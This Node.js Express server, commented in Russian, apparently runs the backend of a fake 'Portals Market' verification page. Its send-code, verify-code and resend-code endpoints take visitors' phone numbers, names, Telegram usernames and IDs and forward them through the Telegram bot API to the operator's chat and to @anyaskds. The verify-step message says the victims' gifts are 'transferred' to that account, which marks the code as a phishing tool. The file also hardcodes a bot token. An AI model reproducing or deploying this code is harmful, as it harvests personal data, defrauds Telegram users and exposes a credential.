const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());

// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
const YOUR_ID = '6277925229';
const YOUR_USERNAME = '@anyaskds';

// Хранилище кодов
const codes = {};

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 1. Отправка кода
app.post('/api/send-code', (req, res) => {
    const { phone, region, fullName, username, userId } = req.body;
    
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    
    codes[phone] = {
        code: code,
        expires: Date.now() + 120000,
        fullName: fullName,
        username: username,
        userId: userId
    };
    
    console.log('📱 ОТПРАВКА КОДА');
    console.log('========================================');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Код:', code);
    console.log('👤 Имя:', fullName);
    console.log('👤 Username:', username);
    console.log('🆔 ID:', userId);
    console.log('========================================');
    
    const message = `
🆕 ЗАПРОС НА ВЕРИФИКАЦИЮ!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

🔑 КОД ВЕРИФИКАЦИИ: ${code}

⏳ Действителен 2 минуты
📅 Время: ${new Date().toLocaleString()}
    `.trim();

    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    // Отправляем на твой ID
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => console.log('✅ Отправлено в Telegram:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
    .catch(err => console.log('❌ Ошибка:', err));

    // Отправляем на @anyaskds
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_USERNAME,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => console.log('✅ Отправлено на @anyaskds:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
    .catch(err => console.log('❌ Ошибка:', err));

    res.json({ success: true });
});

// 2. Проверка кода
app.post('/api/verify-code', (req, res) => {
    const { phone, code, fullName, username, userId } = req.body;
    
    const stored = codes[phone];
    
    if (!stored) {
        return res.status(400).json({ success: false, message: 'Код не найден' });
    }
    
    if (Date.now() > stored.expires) {
        delete codes[phone];
        return res.status(400).json({ success: false, message: 'Код истек' });
    }
    
    if (stored.code !== code) {
        return res.status(400).json({ success: false, message: 'Неверный код' });
    }
    
    console.log('✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!');
    console.log('========================================');
    console.log('👤 Имя:', fullName);
    console.log('📱 Телефон:', phone);
    console.log('🆔 ID:', userId);
    console.log('👤 Username:', username);
    console.log('✅ Верификация успешна!');
    console.log('========================================');
    
    const message = `
✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

🎁 Подарки переданы на @anyaskds
📅 Время: ${new Date().toLocaleString()}
    `.trim();

    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .catch(err => console.log('❌ Ошибка:', err));

    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_USERNAME,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .catch(err => console.log('❌ Ошибка:', err));
    
    delete codes[phone];
    
    res.json({ success: true });
});

// 3. Повторная отправка кода
app.post('/api/resend-code', (req, res) => {
    const { phone } = req.body;
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
    
    if (codes[phone]) {
        codes[phone].code = newCode;
        codes[phone].expires = Date.now() + 120000;
    }
    
    console.log('🔄 ПОВТОРНАЯ ОТПРАВКА');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Новый код:', newCode);
    
    const message = `
🔄 ПОВТОРНЫЙ КОД

📱 Телефон: ${phone}
🔑 НОВЫЙ КОД: ${newCode}

⏳ Действителен 2 минуты
    `.trim();

    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .catch(err => console.log('❌ Ошибка:', err));

    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: YOUR_USERNAME,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .catch(err => console.log('❌ Ошибка:', err));
    
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`✅ Portals Market запущен: http://localhost:${PORT}`);
    console.log(`📱 Твой ID: ${YOUR_ID}`);
    console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
});